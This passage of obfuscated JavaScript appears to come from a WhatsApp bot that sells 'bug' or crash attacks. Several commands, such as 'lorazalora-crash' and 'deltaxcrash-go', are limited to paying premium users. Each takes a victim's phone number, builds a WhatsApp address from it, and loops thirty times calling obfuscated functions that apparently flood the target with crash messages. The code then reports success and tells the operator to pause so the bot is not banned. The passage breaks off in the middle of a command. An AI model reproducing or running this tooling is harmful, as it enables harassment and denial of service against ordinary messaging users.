            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4de787(_0x590c67, _0x600e6e);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4de787(_0x590c67, _0x600e6e);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4de787(_0x590c67, _0x600e6e);
            await _0x4b4561(_0x590c67, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x26e134 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "andronix-xnxx":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x59da5f = q.replace(/[^0-9]/g, '');
          if (_0x59da5f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3fee85 = _0x59da5f + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3eafd8 = 0x0; _0x3eafd8 < 0x1e; _0x3eafd8++) {
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x28a511(_0x3fee85);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x28a511(_0x3fee85);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x28a511(_0x3fee85);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4de787(_0x3fee85, _0x600e6e);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4de787(_0x3fee85, _0x600e6e);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4b4561(_0x3fee85, _0x600e6e);
            await _0x156efb(_0x3fee85, _0x3facec);
            await _0x4de787(_0x3fee85, _0x600e6e);
            await _0x4b4561(_0x3fee85, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x59da5f + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case 'deltaxcrash-go':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4e748f = q.replace(/[^0-9]/g, '');
          if (_0x4e748f.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x454e40 = _0x4e748f + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1abb14 = 0x0; _0x1abb14 < 0x1e; _0x1abb14++) {
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x28a511(_0x454e40);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x28a511(_0x454e40);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x28a511(_0x454e40);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4de787(_0x454e40, _0x600e6e);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4de787(_0x454e40, _0x600e6e);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4b4561(_0x454e40, _0x600e6e);
            await _0x156efb(_0x454e40, _0x3facec);
            await _0x4de787(_0x454e40, _0x600e6e);
            await _0x4b4561(_0x454e40, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x4e748f + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "lorazalora-un":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x252431 = q.replace(/[^0-9]/g, '');
          if (_0x252431.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0xea9b5a = _0x252431 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x370cf4 = 0x0; _0x370cf4 < 0x1e; _0x370cf4++) {
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x28a511(_0xea9b5a);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x28a511(_0xea9b5a);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x28a511(_0xea9b5a);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4de787(_0xea9b5a, _0x600e6e);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4de787(_0xea9b5a, _0x600e6e);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
            await _0x156efb(_0xea9b5a, _0x3facec);
            await _0x4de787(_0xea9b5a, _0x600e6e);
            await _0x4b4561(_0xea9b5a, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x252431 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "lorazalora-pers":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x52b6a2 = q.replace(/[^0-9]/g, '');
          if (_0x52b6a2.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3a0f13 = _0x52b6a2 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x430d2d = 0x0; _0x430d2d < 0x1e; _0x430d2d++) {
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x28a511(_0x3a0f13);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x28a511(_0x3a0f13);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x28a511(_0x3a0f13);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4de787(_0x3a0f13, _0x600e6e);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4de787(_0x3a0f13, _0x600e6e);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
            await _0x156efb(_0x3a0f13, _0x3facec);
            await _0x4de787(_0x3a0f13, _0x600e6e);
            await _0x4b4561(_0x3a0f13, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x52b6a2 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "lorazalora-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4d86d7 = q.replace(/[^0-9]/g, '');
          if (_0x4d86d7.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x24e012 = _0x4d86d7 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x29ca51 = 0x0; _0x29ca51 < 0x1e; _0x29ca51++) {
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x28a511(_0x24e012);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x28a511(_0x24e012);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x28a511(_0x24e012);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4de787(_0x24e012, _0x600e6e);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4de787(_0x24e012, _0x600e6e);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4b4561(_0x24e012, _0x600e6e);
            await _0x156efb(_0x24e012, _0x3facec);
            await _0x4de787(_0x24e012, _0x600e6e);
            await _0x4b4561(_0x24e012, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x4d86d7 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "lorazalora-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x2faf2c = q.replace(/[^0-9]/g, '');
          if (_0x2faf2c.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1335cb = _0x2faf2c + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1112f0 = 0x0; _0x1112f0 < 0x1e; _0x1112f0++) {
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x28a511(_0x1335cb);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x28a511(_0x1335cb);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x28a511(_0x1335cb);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4de787(_0x1335cb, _0x600e6e);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4de787(_0x1335cb, _0x600e6e);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4b4561(_0x1335cb, _0x600e6e);
            await _0x156efb(_0x1335cb, _0x3facec);
            await _0x4de787(_0x1335cb, _0x600e6e);
            await _0x4b4561(_0x1335cb, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x2faf2c + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "lorazalora-infinity":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
